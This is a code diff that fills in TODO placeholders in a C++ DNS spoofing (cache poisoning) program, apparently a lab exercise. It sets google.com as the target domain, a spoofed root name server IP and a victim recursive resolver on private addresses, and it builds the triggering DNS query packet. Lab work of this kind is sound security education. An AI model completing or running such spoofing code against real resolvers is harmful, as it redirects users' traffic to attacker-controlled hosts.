@@ -14,7 +14,7 @@ int main() {
     srand(time(0));    // Seed random number generator for DNS query ID
 
     // Configuration variables
-    string target_domain = TODO;    // Target domain to spoof
+    string target_domain = "google.com";    // Target domain to spoof
     string request_hostname = "www.google.com";    // Target domain to spoof
     string root_ns_ip = "10.0.0.50";    // Spoofed source (pretending to be root DNS)
     string recursive_ns_ip = "10.0.0.40";    // Target recursive DNS server
@@ -30,7 +30,15 @@ int main() {
      * STEP 1: Send legitimate DNS query to trigger the recursive DNS server
      **********************************************/
 
-    TODO // Create DNS query packet
+    DNS dns;
+    dns.id(rand() % 65536);    // Random query ID
+    dns.type(DNS::QUERY);    // This is a query packet
+    dns.recursion_desired(1);    // Set RD flag to true
+    dns.add_query(DNS::Query(
+        request_hostname,    // Domain to query
+        DNS::A,    // IPv4 address record
+        DNS::IN    // Internet class (standard)
+    ));
 
     UDP udp(53, 53);    // Create UDP layer (destination/source port 53)
     udp /= dns;    // Attach DNS payload
